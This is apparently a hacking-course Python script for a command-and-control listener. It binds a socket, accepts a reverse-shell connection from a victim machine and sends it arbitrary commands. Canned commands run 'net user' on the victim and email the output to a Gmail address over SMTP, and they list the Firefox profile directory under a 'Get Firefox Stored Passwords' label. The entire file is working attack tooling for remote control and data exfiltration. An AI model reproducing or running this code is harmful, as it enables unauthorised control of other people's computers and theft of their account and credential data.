#!/usr/bin/env python3

import socket
from termcolor import colored
import signal
import sys
from email.mime.text import MIMEText
import smtplib

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:

    def __init__(self, ip, port):

        self.options = {"get users": "List system valid users (Gmail)", "get firefox": "Get Firefox Stored Passwords", "help": "Show this help panel"}

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        print(f"\n[+] Listening for incoming connections...")

        self.client_socket, client_address = server_socket.accept()

        print(f"\n[+] Connection established by {client_address}")

    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Email enviado\n")

    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.client_socket.recv(2048).decode()

        self.send_email("Users List Ifi - C2", output_command, "tay.invented@gmail.com", ["tay.invented@gmail.com"], "gmail key invented")

    def get_firefox_passwords(self):
        self.client_socket.send(b"dir C:\\Users\\tay\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        output_command = self.client_socket.recv(2048).decode()

        print(output_command)

    def show_help(self):
        for key, value in self.options.items():
            print(f"\n{key} - {value}\n")

    def run(self):
        while True:
            command = input(">> ")

            if command == "get users":
                self.get_users()
            elif command == "help":
                self.show_help()
            elif command == "get firefox":
                self.get_firefox_passwords()
            else:
                command_output = self.execute_remotely(command)
                print(command_output)

if __name__ == '__main__':
    my_listener = Listener("192.168.1.50", 443)
    my_listener.run()
